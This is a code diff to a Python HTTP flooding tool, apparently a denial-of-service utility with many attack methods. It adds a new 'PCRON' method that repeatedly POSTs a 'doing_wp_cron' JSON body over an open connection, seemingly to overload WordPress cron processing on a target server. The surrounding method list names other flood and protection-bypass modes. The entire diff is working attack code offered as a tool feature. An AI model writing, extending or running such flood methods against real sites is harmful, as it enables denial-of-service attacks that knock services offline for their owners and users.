@@ -680,6 +680,7 @@ class HttpFlood(Thread):
 
         self.methods = {
             "POST": self.POST,
+            "PCRON": self.PCRON,
             "CFB": self.CFB,
             "CFBUAM": self.CFBUAM,
             "XMLRPC": self.XMLRPC,
@@ -830,10 +831,24 @@ class HttpFlood(Thread):
         return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
-            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
+            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS","PCRON"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
 
+    def PCRON(self) -> None:
+         payload_data = '{"doing_wp_cron": "1"}'
+         payload = self.generate_payload(
+             ("Content-Length: {}\r\n"
+              "X-Requested-With: XMLHttpRequest\r\n"
+              "Content-Type: application/json\r\n\r\n"
+              "{}").format(len(payload_data), payload_data)
+              )
+         
+         s = None
+         with suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
+         Tools.safe_close(s)
     def POST(self) -> None:
         payload: bytes = self.generate_payload(
             ("Content-Length: 44\r\n"
